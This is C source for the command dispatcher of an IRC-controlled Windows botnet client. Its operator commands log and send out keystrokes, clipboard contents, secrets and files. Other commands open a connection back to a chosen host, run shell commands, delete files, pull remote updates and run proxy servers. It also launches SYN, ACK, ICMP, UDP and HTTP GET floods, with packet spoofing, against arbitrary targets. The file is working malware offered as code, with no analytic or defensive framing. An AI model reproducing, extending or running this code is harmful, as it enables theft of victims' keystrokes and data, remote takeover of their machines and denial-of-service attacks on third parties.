#include "StdAfx.h"
#include "extern.h"

ICMPFLOOD icmpinfo;
TCPFLOOD tcpinfo;
UDPFLOOD udpinfo;

extern char mKeys[KEY_BUF_SIZE];
extern char clipboard_buffer[CLIPBOARD_SIZE*2];

WORD DispatchIrcCommand(char* recvBuf, char* outBuf, DWORD bufsiz, WORD *SentFlag)
{
	static char Cmd[1024], RemUser[128], IrcCmd[64], Dest[64], remNick[64], remHost[128];
	static char sArg1[128], sArg2[128], sArg3[128], sArg4[128];
	int dArg1, dArg2;

	z(Cmd, 1024);
	z(RemUser, 128);
	z(IrcCmd, 64);
	z(Dest, 64);
	z(remNick, 64);
	z(remHost, 128);
	z(sArg1, 128);
	z(sArg2, 128);
	z(sArg3, 128);
	z(sArg4, 128);

	sscanf(recvBuf, "%128s %64s %64s :%[^\n\r]", RemUser, IrcCmd, Dest, Cmd);
	sscanf(RemUser, ":%64[^!]", remNick);

	/// DISPATCH IRC COMMANDS
	if(strstr(RemUser, "PING"))
	{
		_snprintf(outBuf, bufsiz, "PONG %s\n", IrcCmd);
		*SentFlag = SEND_MSG_DIRECT;
		return SUCCESS;
	}
	if(strstr(IrcCmd, "404"))
	{
		char irc_channel[20], secret_irc_key[20];

		strcpy(irc_channel, IRC_CHANNEL);
		strcpy(secret_irc_key, SECRET_IRC_KEY);
		deb("not on channel?\n");
		_snprintf(outBuf, bufsiz, "JOIN #%s %s\n", irc_channel, secret_irc_key);
		deb("sending %s\n", outBuf);
		*SentFlag = SEND_MSG_DIRECT;
		return SUCCESS;
	}
	if(memcmp(Cmd, "\x01\x56\x45\x52\x53\x49\x4f\x4e\x01", 9)==0)
	{
		_snprintf(outBuf, bufsiz, "\001VERSION %s\001\n", IRC_CTCP_VERSION);
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return SUCCESS;
	}
	/// END IRC COMMANDS
	/// check if this is user command
	if(Cmd[0]!='.') {
		deb("no \".\" before command");
		*SentFlag = 0;
		return SUCCESS;
	}
	/// check if this is auth command	
	sscanf(RemUser, "%*[^!]!%s", remHost);
	if(strncmp(Cmd, ".auth.login", 10)==0)
	{
		if(sscanf(Cmd, "%*s %[^,],%[^\x20] %s", sArg1, sArg2, sArg3)!=3)
		{
			deb("less args to auth");
			*SentFlag = 0;
			return SUCCESS;
		}
		deb("host:%s pwd:%s\n", remHost, sArg1);
		if(memcmp(remHost, AuthenticatedHost, strlen(remHost))==0)
		{
			*SentFlag = 0;
			return SUCCESS;
		}
		if(AuthLoginCheckPassword(remHost, main_password, sArg1, sArg2, sArg3)==0)
		{
			strncpy(AuthenticatedHost, remHost, sizeof(remHost));
			_snprintf(outBuf, bufsiz, "%s\n", "accepted");
		}
		else
		{
			_snprintf(outBuf, bufsiz, "%s\n", "fail");
			deb("failed pass");
		}
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return SUCCESS;
	}
	/// check if user allowed to execute commands
	if(memcmp(AuthenticatedHost, remHost, strlen(remHost)))
	{
		*SentFlag = 0;
		return SUCCESS;
	}

	/******* detected command *********/
	/*    Main command dispatcher     */
	/**********************************/
	if(memcmp(Cmd, ".dumpclip ", 9)==0) {
		udp_submit_clipboard(clipboard_buffer);
		memset(clipboard_buffer, 0, sizeof(clipboard_buffer));
		*SentFlag = 0;
		return SUCCESS;
	}
	if(memcmp(Cmd, ".bscs ", 6)==0) {
		char bhost[255];
		int  bport;
		struct bscs_conf bscs_conf;
		DWORD dwSecThread;
		HANDLE temp;

		if(sscanf(Cmd, "%*s %s %d", bhost, &bport)==1)
		{
			deb("bscs: bhost: %s", bhost);
			strcpy(bscs_conf.host, bhost);
			bscs_conf.port = CONTROLPORT;
			temp = xCreateThread(NULL, 0, &open_cl, (void*)&bscs_conf, 0, &dwSecThread);
			CloseHandle(temp);
		}
		else {
			deb("bscs: bhost: %s bport: %d", bhost, bport);
			strcpy(bscs_conf.host, bhost);
			bscs_conf.port = bport;
			temp = xCreateThread(NULL, 0, &open_cl, (void*)&bscs_conf, 0, &dwSecThread);
			CloseHandle(temp);
		}
		*SentFlag = 0;
		return SUCCESS;
	}
	if(memcmp(Cmd, ".check ", 6)==0)
	{
		run_consistance_check();
		return 0;
	}
	if(memcmp(Cmd, ".cdns ", 6)==0)
	{
		char cmdline[255];
		if(sscanf(Cmd, "%*s %[^\n]", cmdline)==1)
		{
			udpdeb("processing cmd [%s]", cmdline);
			process_cmd_dns(cmdline);
		}
		else
		{
			udpdeb(".dns cmd syntax error");
		}
		return 0;
	}
	if(memcmp(Cmd, ".stopudp", 8)==0)
	{
		StopUDP();
		deb("killing all udp threads...");
		return 0;
	}
	if(memcmp(Cmd, ".udp.csleep", 11)==0)
	{
		int i;
		i = sscanf(Cmd, "%*s %d", &udp_user_chunks_sleep);
		if(i==NULL) {
			udpdeb("udp_per_packet_sleep = %d mseconds", udp_user_chunks_sleep);
		}
		else {
			deb("udp chunks delay set to %d mseconds", udp_user_chunks_sleep);
		}
		return 0;
	}
	if(memcmp(Cmd, ".update", 7)==0)
	{
		int	one;
		DWORD thread;

		deb("Initiating on-demand update...");
		one = 1;
		xCreateThread(NULL, 0, &monitor_updates, (void*)&one, 0, &thread);
		Sleep(3);
		return 0;
	}
	if(memcmp(Cmd, ".udp.sendsecrets", 16)==0)
	{
		DWORD dwSecThread;

		deb("sending secrets...");
		xCreateThread(NULL, 0, &send_secrets, (void*)NULL, 0, &dwSecThread);
		*SentFlag = 0;
		return 0;
	}
	if(memcmp(Cmd, ".udp.sendkeys", 13)==0)
	{
		deb("mKeys = %p", mKeys);
		if(!mKeys)
		{
			deb("!mKeys");
			return 1;
		}
		deb("mKeys @ 0x%p", mKeys);
		if(*mKeys!=0x0)
		{
			deb("buffer: %s", mKeys);
			udp_send_msg(KEYS, mKeys, strlen(mKeys), GetLocalInetAddr());
		}
		else
		{
			deb("mKeys zero");
		}
		*SentFlag = 0;
		return 0;
	}
	if(memcmp(Cmd, ".udp.ping", 9)==0)
	{
		udp_send_msg(PING, UPDATE_VERSION, strlen(UPDATE_VERSION), GetLocalInetAddr());
		*SentFlag = 0;
		return 0;
	}
	if(memcmp(Cmd, ".udp.sendfile", 13)==0)
	{
		DWORD thread;
		if(sscanf(Cmd, "%*s %[^\n]", sArg1)==1)
		{
			xCreateThread(NULL, 0, &udp_sendfile, sArg1, 0, &thread);
			wsprintf(outBuf, "Sending %s to server.\n", sArg1);
			*SentFlag = SEND_MSG_TO_RECIEVER;
			return 0;
		}
		udpdeb("syntax\n");
		return 1;
	}
	if(memcmp(Cmd, ".terminate", 11)==0)
	{
		if(!TerminateProcess(GetCurrentProcess(), 0))
		{
			deb("termprocess: %s", FORMATERROR);
		}
		return 0;
	}
	if(memcmp(Cmd, ".findsendfile ", 13)==0)
	{
		char stdir[MAX_PATH];
		char mask[64];

		if(sscanf(Cmd, "%*s %s %s", stdir, mask)!=2)	{
			wsprintf(outBuf, "[from] [mask]\n");
			*SentFlag = SEND_MSG_TO_RECIEVER;
			return 0;
		}
		deb("find %s from %s", mask, stdir);
		DoFindFile(stdir, mask, 1);
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}
	if(memcmp(Cmd, ".findfile ", 10)==0)
	{
		char stdir[MAX_PATH];
		char mask[64];

		if(sscanf(Cmd, "%*s %s %s", stdir, mask)!=2)
		{
			wsprintf(outBuf, "[from] [mask]\n");
			*SentFlag = SEND_MSG_TO_RECIEVER;
			return 0;
		}
		deb("find %s from %s", mask, stdir);
		DoFindFile(stdir, mask, 0);
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}
	if(memcmp(Cmd, ".hostname ", 9)==0) {
		char szResult[255];
		DoDns(GetLocalInetAddr(), szResult);
		wsprintf(outBuf, "%s => %s\n", szResult, GetLocalInetAddr());
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}
	if(memcmp(Cmd, ".auth.passwd ", 12)==0) {
		sscanf(Cmd, "%*s %s %s", sArg1, sArg2);
		AuthChangePassword((u_char*)sArg1, (u_char*)sArg2);
		wsprintf(outBuf, "Password set to %s key: %s.\n", sArg1, sArg2);
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}
	if(memcmp(Cmd, ".coreserver", 11)==0) {
		sscanf(Cmd, "%*s %s", sArg1);
		SetCoreServers(sArg1);
		wsprintf(outBuf, "Set coreserver to %s.\n", sArg1);
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}
	if(memcmp(Cmd, ".httpserver", 11)==0) {
		sscanf(Cmd, "%*s %d %[^\n]", &dArg1, sArg1);
		deb("httpserver: port %d path '%s'\n", dArg1, sArg1);
		if(dArg1==0)
			HttpServer(DISABLE, 0);
		else
			HttpServer(ENABLE, dArg1, strlen(sArg1)>2 ? sArg1 : NULL);
		return 0;
	}
	/*if(memcmp(Cmd,".screen", 7) == 0)
	{
	DCCSEND dcc;
	DWORD thread;
	char szTemp[MAX_PATH];
	char szTempFile[MAX_PATH];

	GetTempPath(MAX_PATH,szTemp);
	if( !GetTempFileName( szTemp, "asa", 0, szTempFile) )
	{
	deb("tempfilename: %s",FORMATERROR);
	udpdeb("tempfilename: %s",FORMATERROR);
	return 0;
	}

	if( Capture( szTempFile ) == TRUE)
	{
	wsprintf(outBuf,"Take it.\n");
	lstrcpy(dcc.target, remNick);
	strncpy(dcc.file, szTempFile, MAX_PATH);
	strncpy(dcc.sfile, szTempFile, MAX_PATH);
	xCreateThread(NULL, 0, &DccSend, (void *)&dcc, 0, &thread);
	}
	else
	wsprintf(outBuf,"Capture failed, possible error: %s\n",FORMATERROR );
	*SentFlag = SEND_MSG_TO_RECIEVER;
	return 0;
	}*/
	if(memcmp(Cmd, ".active", 7)==0)
	{
		char WndTxt[1024];

		SetUserDesktop(1);
		if(GetWindowText(GetForegroundWindow(), WndTxt, sizeof(WndTxt))>0)
			wsprintf(outBuf, "Active window: %s.\r\n", WndTxt);
		else
		{
			deb("Failed to get active window: %s", FORMATERROR);
		}
		*SentFlag = SEND_MSG_TO_RECIEVER;
		SetUserDesktop(0);
		return 0;
	}
	if(memcmp(Cmd, ".dccsend", 8)==0)
	{
		DCCSEND dcc;
		DWORD thread;

		if(sscanf(Cmd, "%*s %s \"%[^\"] \"%s", sArg1, sArg2, sArg3)!=3)
			wsprintf(outBuf, "Malformed request. syntax: .dccsend nick \"fname\" dccfname\n");
		else
		{
			if(GetFileAttributes(sArg2)==0xFFFFFFFF)
			{
				wsprintf(outBuf, "File %s not found.\n", sArg2);
				*SentFlag = SEND_MSG_TO_RECIEVER;
				return 0;
			}
			lstrcpy(dcc.target, sArg1);
			strncpy(dcc.file, sArg2, MAX_PATH);
			strncpy(dcc.sfile, sArg3, MAX_PATH);
			xCreateThread(NULL, 0, &DccSend, (void *)&dcc, 0, &thread);
			wsprintf(outBuf, "Sending %s to %s as \"%s\".\n", sArg2, sArg1, sArg3);
		}
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}

	if(memcmp(Cmd, ".ddos.stop", 10)==0) 
	{
		StopDDOS();
		return 0;
	}

	if(memcmp(Cmd, ".threads.killnum", 16)==0) 
	{
		if(sscanf(Cmd, "%*s %d", &dArg1)!=1) 
		{
			udpdeb("param: <thread_number>\n");
			*SentFlag = 0;
			return 0;
		}
		KillThreadByNumber(dArg1);
		*SentFlag = 0;
		return 0;
	}

	if(memcmp(Cmd, ".threads.killpat", 16)==0) 
	{
		if(sscanf(Cmd, "%*s %s", sArg1)!=1) 
		{
			udpdeb("param: <thread_pattern>\n");
			*SentFlag = 0;
			return 0;
		}
		KillThreadByPattern(sArg1);
		*SentFlag = 0;
		return 0;
	}

	if(memcmp(Cmd, ".threads ", 8)==0)
	{
		ListThreads(outBuf);
		udpdeb("%s", outBuf);
		*SentFlag = 0;
		return 0;
	}

	if(memcmp(Cmd, ".move ", 5)==0)
	{
		sscanf(Cmd, "%*s \"%[^\"] \"%[^\"]", sArg1, sArg2);
		if(!MoveFile(sArg1, sArg2))
			wsprintf(outBuf, "%s\n", FORMATERROR);
		else
			wsprintf(outBuf, "Done.\n");
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}

	if(memcmp(Cmd, ".copy ", 5)==0)
	{
		sscanf(Cmd, "%*s \"%[^\"] \"%[^\"]", sArg1, sArg2);
		if(!CopyFile(sArg1, sArg2, FALSE))
			wsprintf(outBuf, "%s\n", FORMATERROR);
		else
			wsprintf(outBuf, "Done.\n");
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}
	if(memcmp(Cmd, ".delete ", 7)==0)
	{
		sscanf(Cmd, "%*s %[^\n]", sArg1);
		if(!DeleteFile(sArg1))
			wsprintf(outBuf, "%s\n", FORMATERROR);
		else
			wsprintf(outBuf, "File %s deleted.\n", sArg1);
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}
	if(memcmp(Cmd, ".dns", 4)==0)
	{
		char szResult[255];

		if(sscanf(Cmd, ".%*s %s", sArg1)!=1)
		{
			wsprintf(outBuf, "Malformed request.\n");
		}
		else
		{
			DoDns(sArg1, szResult);
			wsprintf(outBuf, "%s => %s\n", sArg1, szResult);
		}
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}
	if(memcmp(Cmd, ".ddos.spoofing", 13)==0)
	{
		if(strstr(szLocalIP, "127.0.0.1")||strstr(szLocalIP, "192.168."))
			udpdeb("There is no reason to set spoofing on NAT/dialup network.\n");
		else
		{
			strstr(Cmd, "off") ? packet_spoofing = 0 : packet_spoofing = 1;
			wsprintf(outBuf, "Spoofing is %s\n", packet_spoofing ? "on" : "off");
		}
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}

	/* Syn ddos, packet, ack. */
	if(memcmp(Cmd, ".ddos.syn ", 9)==0||
		memcmp(Cmd, ".ddos.ack ", 9)==0 ||
		 memcmp(Cmd, ".ddos.packet ", 12)==0)
	{
		DWORD thread;
		HANDLE ddos;
		int i;

		sscanf(Cmd, ".%s %s %d %d", tcpinfo.type, tcpinfo.target, &tcpinfo.port, &tcpinfo.time);
		if(lstrlen(tcpinfo.target)<3||tcpinfo.port<0||tcpinfo.port > 65535)
		{
			wsprintf(outBuf, "Malformed 'target port time' %s:%d for %d minutes\n", tcpinfo.target, tcpinfo.port, tcpinfo.time);
			*SentFlag = SEND_MSG_TO_RECIEVER;
			return 0;
		}
		for(i = 0;i<DDOS_THREADS;i++)
			ddos = xCreateThread(NULL, 0, &TCP, (void *)&tcpinfo, 0, &thread);
		udpdeb("[%s] Packeting %s for %d minute(s) ...\n", tcpinfo.type, tcpinfo.target, tcpinfo.time);
		return 0;
	}

	/* ICMP ddos */
	if(memcmp(Cmd, ".ddos.icmp", 9)==0)
	{
		DWORD thread;
		HANDLE ddos;
		int i;

		sscanf(Cmd, "%*s %s %d", icmpinfo.target, &icmpinfo.time);
		if(lstrlen(icmpinfo.target)<3||icmpinfo.time<=0)
		{
			wsprintf(outBuf, "Malformed 'target time' %s for %d minutes\n", icmpinfo.target, icmpinfo.time);
			*SentFlag = SEND_MSG_TO_RECIEVER;
			return 0;
		}
		for(i = 0;i<DDOS_THREADS;i++)
			ddos = xCreateThread(NULL, 0, &ICMP, (void *)&icmpinfo, 0, &thread);
		udpdeb("[ICMP] Packeting %s for %d minute(s) ...\n", tcpinfo.target, tcpinfo.time);
		return 0;
	}

	/* UDP ddos */
	if(memcmp(Cmd, ".ddos.udp ", 8)==0)
	{
		DWORD thread;
		HANDLE ddos;
		int i;

		sscanf(Cmd, "%*s %s %d %d", udpinfo.target, &udpinfo.port, &udpinfo.time);
		if(lstrlen(udpinfo.target)<3||udpinfo.port<0||udpinfo.port > 65535)
		{
			wsprintf(outBuf, "Malformed 'target port time' %s:%d for %d minutes\n", udpinfo.target, udpinfo.port, udpinfo.time);
			*SentFlag = SEND_MSG_TO_RECIEVER;
			return 0;
		}
		for(i = 0;i<DDOS_THREADS;i++)
			ddos = xCreateThread(NULL, 0, &UDP, (void *)&udpinfo, 0, &thread);
		udpdeb("[UDP] Packeting %s for %d minute(s) ...\n", tcpinfo.target, tcpinfo.time);
		return 0;
	}

	/* GET ddos */
	if(memcmp(Cmd, ".ddos.get ", 8)==0)
	{
		int res = sscanf(Cmd, "%*s %s %s %s", sArg1, sArg2, sArg3);
		deb("starting ddos.get thread,params=%d\n", res);

		if(res==3) 
		{
			if((dArg1 = atoi(sArg2))==0) 
			{
				*SentFlag = SEND_MSG_TO_RECIEVER;
				_snprintf(outBuf, bufsiz, "Erroneous thread number: %s.\n", sArg1);
				return SUCCESS;
			}
			if((dArg2 = atoi(sArg3))==0) 
			{
				*SentFlag = SEND_MSG_TO_RECIEVER;
				_snprintf(outBuf, bufsiz, "Erroneous minutes time number: %s.\n", sArg2);
				return SUCCESS;
			}

			HttpGet(dArg1, dArg2, sArg1, NULL);
			_snprintf(outBuf, bufsiz, "Starting GET flood.\n");
			*SentFlag = SEND_MSG_TO_RECIEVER;
			return SUCCESS;
		}
		*SentFlag = SEND_MSG_TO_RECIEVER;
		_snprintf(outBuf, bufsiz, "Erroneous parameter number: %s. Usage: httpget url [threads] [minutes]\n", sArg2);
		return SUCCESS;
	}
	if(memcmp(Cmd, ".uptime", 7)==0)
	{
		int d, h, m, s;
		GetUptime(GetTickCount(), &d, &h, &m, &s);
		wsprintf(outBuf, "System is up for %d day(s) %d hour(s) %d minute(s)\n", d, h, m);
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}
	if(memcmp(Cmd, ".sys ", 5)==0)
	{
		WORD mode = 0;
		if(strstr(Cmd, "reboot"))
			mode = EWX_REBOOT;
		else if(strstr(Cmd, " off"))
			mode = EWX_POWEROFF;
		else if(strstr(Cmd, "logoff"))
			mode = EWX_LOGOFF;
		else
		{
			wsprintf(outBuf, "sys: param must be reboot/off/logoff\n");
			*SentFlag = SEND_MSG_TO_RECIEVER;
			return 0;
		}

		if(strstr(Cmd, "force"))
			mode |= EWX_FORCE;

		WindowsControl(mode);
		return 0;
	}
	if(memcmp(Cmd, ".install", 8)==0)
	{
		if(!RegisterService(DLL_PATH))
			wsprintf(outBuf, "Install OK.\n");
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}
	/* unhook keyboard */
	if(memcmp(Cmd, ".unhookkeys", 10)==0)
	{
		keylogger(0);
		wsprintf(outBuf, "Keyboard hook unloaded.\n");
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}
	/* hook keyboard */
	if(memcmp(Cmd, ".hookkeys", 10)==0)
	{
		if(IsTypeRunning(KEYS_THREAD))
			wsprintf(outBuf, "Keyboard hook already installed.\n");
		else
		{
			keylogger(1);
			wsprintf(outBuf, "Keyboard hook loaded.\n");
		}
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}
	/* kill us from registry */
	if(memcmp(Cmd, ".uninstall", 10)==0)
	{
		delservice();
		wsprintf(outBuf, "Service uninstalled.\n");
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}
	/* dump out keys */
	if(memcmp(Cmd, ".dumpkeys", 9)==0)
	{
		udpdeb("Keys: %s\n", dumpkeys());
		deb("Data to dump: %s\n", dumpkeys());
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return 0;
	}
	if(memcmp(Cmd, ".version", 8)==0)
	{
		wsprintf(outBuf, "%s\n", INTERNAL_VERSION);
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return SUCCESS;
	}
	/* show or change variables */
	if(memcmp(Cmd, ".set", 4)==0) {
		GetInfo(outBuf, bufsiz);
		*SentFlag = SEND_MSG_TO_RECIEVER;
		return SUCCESS;
	}
	if(memcmp(Cmd, ".terminate", 10)==0) {
		Terminate = 1;
		*SentFlag = 0;
		return SUCCESS;
	}
	if(memcmp(Cmd, ".reconnect", 10)==0) {
		Reconnect = 1;
		*SentFlag = 0;
		return SUCCESS;
	}
	/* http update */
	if(memcmp(Cmd, ".httpupdate", 11)==0) {
		sscanf(Cmd, "%*s %s", sArg1);
		HttpUpdate(sArg1);
		*SentFlag = 0;
		return SUCCESS;
	}
	/* private IRC command */
	if(memcmp(Cmd, ".raw", 4)==0) {
		sscanf(Cmd, "%*s %[^\n]", sArg1);
		_snprintf(outBuf, bufsiz, "%s\n", sArg1);
		*SentFlag = SEND_MSG_DIRECT;
		return SUCCESS;
	}

	/* Messagebox! */
	if(strstr(Cmd, ".messagebox")) 
	{
		sscanf(Cmd, "%*s %[^\n]", sArg1);
		msg_box(sArg1);
		*SentFlag = 0;
		return SUCCESS;
	}
	/// httpget command
	if(strncmp(Cmd, ".httpget", 8)==0) 
	{
		int res = sscanf(Cmd, "%*s %s %s", sArg1, sArg2);
		deb("starting httpget thread,params=%d\n", res);
		if(res==2) 
		{
			sscanf(Cmd, "%*s %s %[^\n]", sArg1, sArg2);
			HttpGet(1, HTTP_SECONDS_READ_TIMEOUT, sArg1, sArg2);
			*SentFlag = 0;
			return SUCCESS;
		}
		*SentFlag = SEND_MSG_TO_RECIEVER;
		_snprintf(outBuf, bufsiz, "Erroneous parameter number: %d. (%s) Usage: httpget url [threads] [minutes] saveto\n", res, sArg2);
		return SUCCESS;
	}

	/// identd command
	if(strncmp(Cmd, ".identd", 7)==0)
	{
		int hId;
		*SentFlag = SEND_MSG_TO_RECIEVER;
		sscanf(Cmd, "%*s %s", sArg1);
		if(strncmp(sArg1, "off", 3)==0) 
		{
			hId = IdentServer(DISABLE);
			_snprintf(outBuf, bufsiz, "terminating identd thread.\n\n");
			return SUCCESS;
		}
		if((hId = IdentServer(ENABLE, sArg1))==ERR) 
		{
			_snprintf(outBuf, bufsiz, "identd thread failed.\n\n");
			return SUCCESS;
		}
		else 
		{
			_snprintf(outBuf, bufsiz, "identd thread created, pid %d.\n", hId);
			return SUCCESS;
		}
	}

	/// socks command
	if(strncmp(Cmd, ".socks", 6)==0)
	{
		int hId;
		*SentFlag = SEND_MSG_TO_RECIEVER;
		sscanf(Cmd, "%*s %d", &dArg1);
		if(dArg1==0) {
			hId = SocksServer(DISABLE);
			_snprintf(outBuf, bufsiz, "terminating socks thread .\n\n");
			return SUCCESS;
		}
		if((hId = SocksServer(ENABLE, dArg1))==ERR) {
			_snprintf(outBuf, bufsiz, "socks thread failed.\n\n");
			return SUCCESS;
		}
		else {
			_snprintf(outBuf, bufsiz, "socks thread created, pid %d.\n", hId);
			return SUCCESS;
		}
	}
	/// other commmands
	if(strstr(Cmd, ".leave"))
	{
		QuitIRC = 1;
		*SentFlag = 0;
		return SUCCESS;
	}
	if(strstr(Cmd, ".nick"))
	{
		*SentFlag = SEND_MSG_DIRECT;
		sscanf(Cmd, "%*s %s", sArg1);
		if(strstr(sArg1, "random")) 
		{
			memset(sArg1, 0x0, sizeof(sArg1));
			GetRandStr(10, sArg1);
			//memcpy(sArg1,IRC_NICK_PREFIX,sizeof(IRC_NICK_PREFIX) - 1);
		}
		_snprintf(outBuf, bufsiz, "NICK %s\n", sArg1);
		SaveNick(sArg1);
		return SUCCESS;
	}
	if(strstr(Cmd, ".join"))
	{
		sscanf(Cmd, "%*s %[^\n]", sArg1);
		_snprintf(outBuf, bufsiz, "JOIN %s\n", sArg1);
		*SentFlag = SEND_MSG_DIRECT;
		return SUCCESS;
	}
	if(strstr(Cmd, ".part"))
	{
		sscanf(Cmd, "%*s %s", sArg1);
		_snprintf(outBuf, bufsiz, "PART %s\n", sArg1);
		*SentFlag = SEND_MSG_DIRECT;
		return SUCCESS;
	}
	if(strstr(Cmd, ".system"))
	{
		sscanf(Cmd, "%*s %[^\n]", sArg1);
		SystemCmd(sArg1, outBuf, bufsiz);
		*SentFlag = 0;
		udp_send_msg(TEXT, outBuf, strlen(outBuf), IrcNick);
		return SUCCESS;
	}

	/// End Dispatcher
	*SentFlag = SEND_MSG_TO_RECIEVER;
	wsprintf(outBuf, "unimplemented command.\n");
	return SUCCESS;
}